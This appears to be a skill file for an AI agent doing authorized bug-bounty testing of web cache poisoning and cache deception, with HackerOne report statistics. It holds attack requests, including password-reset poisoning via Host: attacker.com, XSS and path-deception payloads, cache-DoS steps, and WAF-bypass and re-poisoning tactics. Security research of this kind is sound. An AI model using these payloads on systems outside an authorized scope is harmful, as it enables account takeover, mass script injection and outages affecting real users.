---
name: bbhunt-web-cache
description: "Use for unkeyed headers, cache-key normalization differences, static-extension deception, and cache deception of authenticated pages. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Web Cache Poisoning and Deception — unified methodology

> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.

## Corpus signal — 30 valid reports (9 paid / 30%)

Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| cache / CDN / unkeyed header | 21 |
| header injection (Host / X-Forwarded / etc.) | 13 |
| encoding / double-encode / null byte | 11 |
| JS bundle / source-map inspection | 6 |
| XML / SOAP / SAML / XXE | 6 |
| intercept & replay request in Burp | 4 |
| subdomain / DNS / cert-transparency recon | 4 |
| Content-Type / body-format switch | 4 |
| two-account / cross-account replay | 4 |
| second-order / stored / blind delivery | 3 |
| HTTP method / verb tampering | 3 |
| redirect chain / Location header | 2 |

## Corpus-backed method (this class)

1. Fingerprint the cache: identify cache headers, key components, and which headers/params are ignored by the key.
2. Find a reflection that reaches the cached response body (not only a header).
3. Prove poisoning with a unique marker and a second request from a different context (no your headers) observing the marker.
4. Check normalization differences between cache key and origin routing (dots, slashes, case, encoded separators).
5. For cache deception, test whether a victim's authenticated response can be cached under a static-looking path.
6. Bound the test strictly: never poison a widely used production path with harmful content.

### Signals

- CDN or reverse proxy with caching rules
- Headers reflected in cached responses but not included in the cache key
- Static-extension paths served through a dynamic app

### Kill criteria

- No reflection in cacheable responses, or all reflected inputs are keyed.
- Marker visible only with your own headers — no cross-request effect.
- Test would affect real users beyond the proof; stop and report the design flaw carefully.

### Escalation chains

- Cache poisoning -> stored XSS on a trusted page.
- Cache deception -> authenticated page served to attacker.

### Veteran tip

Always use a unique cache-buster so a proof does not persist and harm other users.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method
### Quick wins

Start here. These are the highest-yield tests for this class.

- Identify cache layers, keys, and TTLs from headers and behavior.
- Find unkeyed inputs: X-Forwarded-Host, X-Host, X-Original-URL, cookies, headers reflected in responses.
- Test cache deception with static extensions on authenticated routes.
- Check normalization mismatches between cache and origin.

### Deeper checklist

- Identify cache layers, cache keys, and TTLs via response headers and behavior.
- Find unkeyed inputs: X-Forwarded-Host, X-Host, X-Original-URL, cookies, headers reflected in responses.
- Test cache deception with static extensions on authenticated routes.
- Check normalization mismatches between cache and origin (encoding, path, host).
- Demonstrate poisoning a victim response or leaking another user's data.
- Avoid persistent poisoning; use a cache-buster where possible.

### Autonomous Testing Priority

**Two distinct attacks live under this skill — target the simpler one first.**

**Attack 1 — Password Reset Poisoning (Host header injection):**

The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim's reset email contains a link to your server.

```
POST /forgot-password
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com

email=victim@target.com
Content-Type: application/x-www-form-urlencoded
```

Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), or the action succeeds (2xx with a "reset email sent" message) after injection — confirming the poisoned link would be sent to the victim.

Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).

**Attack 2 — Web Cache Poisoning:**

Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.

Check for cache signals in the response: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <nonzero>`, or `Via: cloudfront/varnish/fastly`.

**Proof for both:** injected value reflected in response body, or action completed successfully despite the manipulated header.

---

### Step-by-Step Hunting Methodology

1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.

2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).

3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)

4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
   - `GET /account/profile.css`
   - `GET /dashboard/settings.jpg`
   - `GET /affiliate-link/target.js`
   Check if the server returns dynamic content AND the cache stores it.

5. **Test for DoS via cache poisoning.** Send a request with a header that causes a 4xx/5xx error and check if that error response gets cached:
   - Malformed `Host` header
   - `X-Forwarded-Host` pointing to an invalid host
   - Oversized headers that trigger backend errors

6. **Confirm unkeyed parameter poisoning.** Try query parameter fatigue or HTTP parameter pollution:
   - `GET /page?utm_source="><script>alert(1)</script>`
   Check if the param is reflected and cached for clean requests to `/page`.

7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response — it's confirmed.

8. **Measure cache TTL.** Check `Cache-Control: max-age` and `Age` to understand how long the poison persists and whether it's exploitable before expiry.

9. **Check affiliate/link flows specifically.** For platforms like Linkpop, test whether the referrer/product URL is embedded in a cacheable response that another user will receive.

10. **Document blast radius.** Determine: global CDN edge (worldwide), regional cache, or single-server cache. This directly affects severity rating.

---

### A. Discovery checklist — concrete places, params, headers, infra signals to look

- Classify the cache before attacking it. Identify the provider from headers: `X-Cache` / `X-Cache-Status` / `X-Who-Made-This`, `CF-Cache-Status` (Cloudflare), `X-Served-By` + `X-Cache` (Fastly/Varnish), `Age`, `Via`, `Server: cloudfront` / `x-amzn`. Values to watch: `hit`, `miss`, `dynamic`, `refresh`, `HIT`, `MISS`.
- Distinguish the two games up front: poisoning = manipulate the **cache key** (unkeyed inputs) so a malicious response is served to everyone with that key; deception = manipulate **cache rules** so a dynamic/victim response is stored as if static. They chain: "Cache-What-Where" turns an otherwise unexploitable open redirect or self-XSS into mass XSS.
- Harvest unkeyed inputs with Param Miner ("Guess headers" / "Guess params", plus "Add dynamic cachebuster"). Classic unkeyed carriers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Scheme`, `Accept-Language`, cookies, `utm_*` / `ref` query params.
- Look for absolute URLs and script imports built from headers (`<script src="//host/resources/js/tracking.js">`), 302 redirects whose `Location` uses a header, error pages that reflect the request path, and "cart/token in URL" endpoints. These are the reflectors that make poisoned responses harmful.
- Identify cacheable suffixes and prefixes: static extensions `.css`, `.js`, `.ico`, `.exe`, `.txt`; static directories `/static`, `/assets`, `/wp-content`, `/media`, `/templates`, `/public`, `/shared`; exact filenames `robots.txt`, `favicon.ico`, `index.html`. Filter HTTP history to 2xx with script/image/CSS MIME types to find live cache rules.
- Fingerprint parser differences on both sides of the cache: origin delimiters (`;` matrix vars in Spring, `.` format in Rails, `%00` in OpenLiteSpeed, `%0A` in nginx rewrites), encodings, and dot-segment normalization. Cloudflare/Google Cloud/Fastly do **not** normalize paths before applying cache rules; CloudFront/Azure/Imperva do.
- Check CDN-specific gotchas: Cloudflare Cache Deception Armor and its bypasses via uncommon extensions; the port missing from the key on Cloudflare/Fastly; duplicate-header handling (Cloudflare mitigation historically checked only the first header instance — second instance payload survives).### Signals and surfaces
### Signal

- Reports: **68** · paid: **16**
- Median bounty **$650** · p90 **$9,700** · max **$18,900** · total **$43,206**
- Median upvotes **37**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| PayPal | 2 | $28,600 | 1536 |
| Shopify | 5 | $9,000 | 551 |
| HackerOne | 3 | $2,600 | 522 |
| GSA Bounty | 3 | $750 | 131 |
| InnoGames | 1 | $550 | 82 |
| Postmates | 1 | $500 | 343 |
| Mail.ru | 3 | $400 | 74 |
| Algolia | 2 | $400 | 73 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`any CDN/proxy path` `static extensions` `X-Forwarded-*` `Host` `cookies`

### Crown Jewel Targets

Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.

**Highest-value targets:**
- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — poisoning these affects every visitor globally
- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key

**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.

---

### Attack Surface Signals

**URL patterns to look for:**
- `cdn.`, `assets.`, `static.`, `updates.`, `downloads.` subdomains
- URL path structures with extensions that look static: `/path/to/page.css`, `/account.php/nonexistent.jpg`
- Affiliate/link shortener endpoints: `/link/`, `/go/`, `/ref/`, `/out/`
- Paths that mix dynamic content with cacheable-looking URLs

**Response headers that signal a cache:**
```
X-Cache: HIT / MISS
X-Cache-Status: HIT
CF-Cache-Status: HIT / MISS (Cloudflare)
Age: <nonzero>
Via: 1.1 varnish / cloudfront / fastly
Cache-Control: public, max-age=...
Surrogate-Control: max-age=...
X-Served-By: cache-...
```

**JS/tech stack signals:**
- Fastly, Varnish, Cloudfront, Akamai, Nginx proxy_cache in response headers
- Shopify/Linkpop stacks with third-party integrations
- Platforms using path-based routing without normalizing trailing segments
- Servers that reflect unvalidated headers into responses (Host, X-Forwarded-Host, X-Original-URL)

**Dangerous header candidates (unkeyed inputs):**
```
X-Forwarded-Host
X-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Forwarded
X-HTTP-Method-Override
```

---### Techniques and bypasses
### Payloads & probes

- `X-Forwarded-Host: evil.com` `X-Host: evil.com` `X-Forwarded-Scheme: http`
- `/account/profile.css` `/account/profile%2ecss` `/account/profile;.css`
- Cache buster -> `?cb=123` then poison the canonical URL

### Bypass tricks

- Use unkeyed headers that the origin reflects into redirects or HTML.
- Exploit path normalization: `/x/..%2faccount`.
- Poison only your own cache key, then request the victim URL.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851
  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.
- **Stored XSS on https://paypal.com/signin via cache poisoning** — `#488147` · PayPal · $18,900 · ▲685
  > I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
- **Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** — `#591302` · Automattic · $0 · ▲405
  > The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary `Origin` header in the request, which is then echoed back in the response via the…
- **DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com** — `#1695604` · Shopify · $3,800 · ▲266
  > So, when an attacker sends a request with replacing the slashes with backslashes for a certain file, the server will return 404 Not Found error page, and this error will be saved into the cache and any upcoming requests to this file will return 404 Not Found…
- **Denial of service via cache poisoning** — `#409370` · HackerOne · $2,500 · ▲253
  > An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.
- **Static files on HackerOne.com can be made inaccessible through Cache Poisoning attack** — `#1181946` · HackerOne · $0 · ▲228
  > The same attack that was reproduced on `/assets/static/js/8.9572d249.chunk.js?hackerone=poc` could be reproduced on the actual file without any random parameter.
- **XSS and cache poisoning via upload.twitter.com on ton.twitter.com** — `#84601` · X / xAI · $0 · ▲198
  > You may also visit http://innerht.ml/pocs/twitter-upload-xss to see the attack in action.
- **Cache Deception Allows Account Takeover** — `#1698316` · Expedia Group Bug Bounty · $0 · ▲160
  > I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access the `ha.crumb` token located in `/traveler/profile/edit`
- **Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)** — `#1760213` · Expedia Group Bug Bounty · $0 · ▲117
  > The server blocks `</script`but if I send `</sc"ript `
- **Cache Poisoning DoS on downloads.exodus.com** — `#1173153` · Exodus · $0 · ▲110
  > GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
- **Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS** — `#303730` · GSA Bounty · $750 · ▲93
  > In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg…
- **URL Path Manipulation Enables Cache Poisoning of Amazon Affiliate Products in Shopify Linkpop** — `#1848940` · Shopify · $500 · ▲88
  > In your attacker's Linkpop account, add a new Amazon product using the following crafted link `https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]` and make sure to replace the placholders
- **Cache poisoning Denial of Service affecting assets.gitlab-static.net** — `#1160407` · GitLab · $0 · ▲83
  > However since the `x-http-method-override` header is not included in the cache key and the varnish configuration used does not proccess the `x-http-method-override`, this empty response will also be forwarded to all other users requesting the file, with…
- **https://themes.shopify.com::: Host header web cache poisoning lead to DoS** — `#1096609` · Shopify · $2,900 · ▲82
  > $ while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
- **Cache Poisoning DoS on updates.rockstargames.com** — `#1219038` · Rockstar Games · $0 · ▲77
  > In this report, the researcher discovered that there was a cache poisoning weakness on `updates.rockstargames.com` due to an unkeyed header, `trailer`.
- **Cache poisoning via X-Forwarded-Host in www.shopify.com/partners/blog** — `#977851` · Shopify · $1,000 · ▲67
  > i've logged to my VPS to verify this bug and downloaded poisoned page (https://www.shopify.com/partners/blog/7-web-design-and-development-awards-you-should-enter) , it's contains links to collabolator:
- **CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)** — `#260697` · Discourse · $0 · ▲58
  > Add the `no-cache` headers, `Cache-Control` and/or `Expire` on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific.
- **DOS via cache poisoning on [developer.mozilla.org]** — `#1976449` · Mozilla · $0 · ▲55
  > This is possible by adding an header and a value causing an error on the back-end side (error 404), the bad configuration of the cache makes it possible to save the response there and to serve it to users visiting the page, making the page completely…
- **Web Cache Deception Attack (XSS)** — `#394016` · Discourse · $256 · ▲51
  > Also, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:
- **Shopify.com Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** — `#1271944` · Shopify · $800 · ▲48
  > - `https://help.shopify.com/es/manual/your-account/copyright-and-trademark/<RANDOM STRING .css`
- **Web Cache Deception vulnerability on algolia.com leads to personal information leakage** — `#1530066` · Algolia · $400 · ▲47
  > A web cache deception(WCD) was found on our main website (algolia.com).
- **Web Cache poisoning attack leads to User information Disclosure and more** — `#631589` · Lyst · $0 · ▲45
  > https://www.lyst.com/shop/trends/mens-dress-shoes/blahblah.css
- **DNS Cache Poisoning** — `#487` · HackerOne · $100 · ▲41
  > I noticed if I made a request to your website, intercepted the request, and added the header...
- **Web cache poisoning leads to disclosure of CSRF token and sensitive information** — `#504514` · Smule · $0 · ▲39
  > The page [https://www.smule.com/s/smule groups/user groups/user name](https://www.smule.com/s/smule groups/user groups/fossnow27) is vulnerable to web cache poisoning, on adding `X-Forwarded-Host` header to the request multiple request links get change which…
- **Web Cache Poisoning on  █████** — `#1183263` · U.S. Dept Of Defense · $0 · ▲36
  > The web application `https://████████` uses a web cache to more efficiently serve its pages to the users.
- **Bypassing Cache Deception Armor using .avif extension file** — `#1391635` · Cloudflare Public Bug Bounty · $0 · ▲36
  > I was able to achieve Cache Deception and/ Poisoning to Cloudflare Customers who were using `Cache Deception Armor` Software using `.avif` extension file
- **Cache poisoning using NULL bytes and long URLs** — `#334709` · Greenhouse.io · $0 · ▲32
  > We can see that the value of the `applicationURI` URL prefix is 6155 bytes long, which is close to the maximum number of bytes in the URL I was able to send to the `board.greenhouse.io` server, before receiving `ERR CONNECTION CLOSED`.
- **Web cache poisoning at www.acronis.com** — `#1010858` · Acronis · $0 · ▲29
  > Remove the parameters, x-forwarded-port, and origin in the request header.
- **HTTP request smuggling on Basecamp 2 allows web cache poisoning** — `#919175` · Basecamp · $0 · ▲28
  > Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request.
- **Web cache deception attack - expose token information** — `#397508` · Chaturbate · $0 · ▲28
  > Then after go to `https://chaturbate.com/my collection/min.js`.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 5× | `%00` |
| 1× | `GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2 / Host: hackerone.com / x-forwarded-scheme: http` |
| 1× | `</script` |
| 1× | `</sc"ript>` |
| 1× | `GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1 / Host: downloads.exodus.com / Authorization: SharedKeyLite myaccount` |
| 1× | `https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]` |
| 1× | `https://amazon.ca/dp/███/../████████` |
| 1× | `GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.c` |
| 1× | `GET /patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1 HTTP/1.1 / Host: updates.rockstargames.com / tr` |
| 1× | `X-Forwarded-Host : foobar.pl"><img src=x onerror=blah>` |
| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |
| 1× | `GET /u/x.css HTTP/1.1` |
| 1× | `POST /users/$username/preferences/email.json HTTP/1.1 / / _method=PUT&email=$attacker_email&authenticity_token=$csrf_token` |
| 1× | `/u/$rand.css` |
| 1× | `<% woff2_url = "#{asset_path("fontawesome-webfont.woff2")}?#{font_domain}&v=4.7.0".html_safe %> / <link rel="preload" href="<%=woff2_url%>` |
| 1× | `GET /?xx HTTP/1.1 / Host: meta.discourse.org / X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>` |
| 1× | `https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.dom` |
| 1× | `https://help.shopify.com/es/manual/your-account/copyright-and-trademark/<RANDOM_STRING>.css` |
| 1× | `https://hatchful.shopify.com/furniture-logo-maker%25%32%46random.css` |
| 1× | `curl -i -s -k -X $'GET' \ / -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \ / $'https://feder` |

### Common Root Causes

1. **CDN misconfiguration — caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.

2. **Unkeyed header forwarding.** Developers configure reverse proxies to forward `X-Forwarded-Host` to backends for URL generation (canonical links, redirects, password reset emails) without including it in the cache key. The CDN caches the poisoned response.

3. **Web Cache Deception via permissive routing.** Frameworks that normalize URLs (e.g., Rails, Express) accept `/account/settings.css` and serve the same response as `/account/settings`. The CDN sees a `.css` extension and applies aggressive caching rules.

4. **Shared caching of multi-tenant responses.** SaaS platforms that use a single CDN without tenant isolation in the cache key allow cross-tenant cache poisoning.

5. **Error responses cached without thought.** Backend errors (404, 500) triggered by attacker-controlled input get cached, causing DoS for legitimate users. Developers implement caching without excluding error status codes.

6. **Lazy `Vary` header implementation.** Developers know they should add `Vary: X-Forwarded-Host` but forget, or CDNs strip/ignore `Vary` headers entirely (Cloudflare historically strips Vary on some asset types).

7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects — and these get cached globally.

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Basic poisoning cycle: (1) find unkeyed input reflected into a response, (2) elicit a harmful response (XSS, open redirect, 500), (3) get it cached under a victim's key, then fetch clean to confirm. Always add a unique cachebuster request parameter while testing so you don't poison real users.
- Duplicate-header bypass of first-header-only validation:
  ```
  GET / HTTP/1.1
  Host: target
  X-Forwarded-Host: target
  X-Forwarded-Host: evil.com
  ```
  Front-end inspects the first value; back-end concatenates into `target, evil.com` or uses the second.
- Path-mapping deception (REST origin vs traditional cache):
  `/user/123/profile/wcd.css` -> origin reads `/user/123/profile`, cache stores `.css`.
- Delimiter deception: `/settings/users/list;aaa.js` where the origin truncates at `;` (Spring) but the cache sees the full path with `.js`. Test every ASCII char both raw and URL-encoded with Burp Intruder (disable automatic payload encoding).
- Encoded-delimiter / decoding mismatch: `/profile%23wcd.css` (origin decodes `%23` to `#` and truncates; cache doesn't), `/myaccount%3fwcd.css` (cache applies `.css` rule then decodes `%3f` to `?` before forwarding).
- Normalization deception shapes from "Gotta cache 'em all":
  - Cache normalizes, origin does not: `/<dynamic>%2f%2e%2e%2f<static-dir>` — pair it with an origin-only delimiter, e.g. `/profile;%2f%2e%2e%2fstatic`.
  - Origin normalizes, cache does not: `/<static-dir>/..%2f<dynamic>` e.g. `/assets/..%2fprofile`. Encode every dot-segment slash so the victim's browser does not resolve it.
  - Static-file rule: `/<dynamic><delimiter><encoded-dot-segment><static-file>` with a cachebuster to avoid hitting an existing entry.
- Key normalization poisoning: with a normalized key and a self-reflected XSS on a 404, use `GET /<backend-path><path-traversal><poisoned-path>` to store the payload under a high-traffic key like `/home`.
- Front-end delimiter key poisoning (no user interaction needed): `GET /<poisoned-path><front-end-delimiter><path-traversal><backend-path>` — `#` variants work when the cache treats it as a delimiter and forwards the suffix.
- Cache-What-Where escalation: poison an unkeyed `X-Forwarded-Host` open redirect into the cached `/main.js` key, so every visitor loading the homepage fetches attacker-controlled JavaScript. A cached 302 with `Cache-Control: public, max-age=3600` removes the need for a static extension entirely.
- `Fastly purge` / `PURGE` method can be unauthenticated on some setups — use it to punch holes and determine whether a page is genuinely dynamic (research tip), but avoid destructive use on live targets.

### Payload & Detection Patterns

**Confirm caching behavior:**
```bash
# Send twice, compare Age header
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
```

**Test unkeyed X-Forwarded-Host:**
```bash
curl -s -H "X-Forwarded-Host: evil.attacker.com" \
  "https://target.com/page" | grep -i "evil.attacker.com"
```

**Test Web Cache Deception (path appending):**
```bash
# Authenticated session cookie required
curl -s -b "session=YOUR_SESSION" \
  "https://target.com/account/profile.css"

# Then fetch without auth from another client
curl -s "https://target.com/account/profile.css"
```

**Force cache miss to test poison without hitting cached version:**
```bash
# Use a unique cache-busting query param to land on a fresh key — do NOT rely on
# client-sent "Cache-Control: no-cache" (per RFC 7234 it requests revalidation, not
# skip-storage, and Cloudflare/Fastly/Akamai generally ignore it on cacheable assets).
curl -s -H "X-Forwarded-Host: canary.attacker.com" \
     "https://target.com/page?cb=$RANDOM"
```

**DoS via poisoned error response:**
```bash
curl -s -H "X-Forwarded-Host: aaaaaaaaaaa.invalid" \
  "https://target.com/js/app.js" -I
# Check if next clean request returns error
curl -s -I "https://target.com/js/app.js" | grep "HTTP/"
```

**Grep patterns in Burp/ZAP response history:**
```
# Headers indicating cache hit
X-Cache: HIT
CF-Cache-Status: HIT
Age: [1-9]

# Reflected unkeyed input in body
evil\.attacker\.com
canary\d+\.

# Web cache deception indicators
Content-Type: text/css  (but response is HTML/JSON)
Cache-Control: public.*max-age  (on authenticated endpoint)
```

**Parameter pollution test:**
```bash
curl -s "https://target.com/page?cb=1&param=CANARY_VALUE" | grep CANARY_VALUE
# Then check if clean request returns poisoned version
curl -s "https://target.com/page?cb=1"
```

**Burp Suite Intruder wordlist for unkeyed headers:**
```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
X-Original-URL
X-Rewrite-URL
X-Forwarded-Scheme
X-Forwarded-Proto
True-Client-IP
```

---

### Bypass Techniques

**Defense: WAF blocking known poison headers**
- Bypass: Use less-common header variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.com`, `X-Original-URL`
- Bypass: Header value encoding: `X-Forwarded-Host: evil%2ecom`
- Bypass: Case variation: `x-forwarded-host`, `X-FORWARDED-HOST`

**Defense: Stripping attacker-supplied headers at edge**
- Bypass: Use HTTP/2 pseudo-header manipulation if the proxy downgrades to HTTP/1.1
- Bypass: Inject via HTTP Request Smuggling — smuggle a request with poison headers past the WAF to hit the cache server directly

**Defense: Require authentication before caching**
- Bypass: Web Cache Deception — trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth

**Defense: Cache key includes full URL with query string**
- Bypass: HTTP Parameter Pollution — some parsers take the first occurrence, caches key on full string; inject `?legit=1&param=evil` and cache stores it under `?legit=1&param=evil` but victim visits `?legit=1`
- Bypass: Fat GET request — send body parameters that the backend processes but the cache ignores

**Defense: Short TTL / rapid cache purging**
- Bypass: Automate re-poisoning; send the poison request in a loop just ahead of TTL expiry
- Bypass: Target CDN nodes with longer default TTLs by routing requests through specific PoPs

**Defense: `Cache-Control: private` on sensitive endpoints**
- Bypass: Check if CDN respects this header (some CDNs ignore it if an admin has overridden cache rules globally)
- Bypass: Find adjacent cacheable endpoints that reflect the same sensitive data

---### Validation and proof
### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

1. **What can the attacker DO right now?**
   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response — not just their own browser. If only the attacker sees the effect, it's not cache poisoning.

2. **What does the victim LOSE?**
   Must be one of: (a) session/account compromise via reflected credentials in poisoned response, (b) execution of attacker-controlled JS via poisoned asset, (c) service denial where legitimate requests return error responses, or (d) sensitive data disclosure (account details cached and served to other users). "Weird response headers" alone is not impact.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: send the poisoning request → wait for cache store → fetch the URL from incognito/different IP → observe poisoned response. If you can't demonstrate this clean reproduction with a second client, the cache may not actually be storing the poison and the report isn't ready.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Prove caching, not just cacheability: send once -> `X-Cache: miss`, resend same key -> `hit` with increasing `Age`. A `Cache-Control: public, max-age=...` alone only suggests cacheability; some caches override it.
- Poison once, then fetch with a **clean** request (no injected header, or a normal browser) on the same key. If the clean request receives your payload, poisoning is real. If you must add a cachebuster during testing, remove it for the final proof.
- For deception, the victim response must contain sensitive data, not merely a static file. Inspect the cached body (API keys, CSRF tokens, session state) — header-only confirmation is insufficient.
- An unkeyed input alone is not a finding. Require that the origin actively uses it and that the resulting response is cached and harmful. Duplicate the "clean" fetch from a second session/IP to demonstrate cross-user impact.
- Watch for self-inflicted cache poisoning: always use unique cache keys during discovery; never leave a poisoned production entry for real users. If you do, purge or let it expire and document the cleanup.
- Browser-constraint check: a payload needing unencoded `#`, `{`, `<`, `>` or raw CRLF may be rewritten by the browser. For deception the link must survive browser normalization — re-test the final URL in a real browser, not only in Repeater. Poisoning does not need a browser link, so it can use those characters directly.
- Defensive framing for reports: dynamic responses should carry `Cache-Control: no-store, private`; ensure cache rules do not override it; enable content-type/extension matching (Cache Deception Armor); avoid key normalization and stop forwarding suffix-after-delimiter to the origin.

- Map the cache key explicitly: add a unique query param and vary `Origin`, `Accept-Encoding`, `Cookie`, Host port, and user-agent one at a time; observe which changes bust the cache. Cache keys commonly include path + query + Host, sometimes `Accept-Encoding`; anything that changes the response but not the key is a poison candidate.
- Check `Vary` response headers. If `Vary: Accept-Language` is absent but the response changes with `Accept-Language`, you have both a cache-poisoning and a client-side cache-poisoning candidate.
- Look for cache rules keyed on unusual file extensions (`.php`, `.ashx`, `.exe`, `.jpg`) — test a broad extension wordlist, not only `.js`/`.css`.
- Omer Gil's original WCD technique still applies where cache and origin disagree on URL mapping; combine it with the 2024 normalization/discrepancy research for arbitrary responses, not just profile endpoints.
- Caching can be per-POP: confirm a poisoned response from multiple vantage points before claiming "all users" impact; some effects are regional.
- Measure response-time deltas as a secondary cache signal: repeated misses should be slower than hits; a flat timing curve means the path may not be cached at all.
- If a cache rule overrides `Cache-Control: no-store/private`, report that explicitly — it is the root cause and makes the impact systemic rather than endpoint-specific.
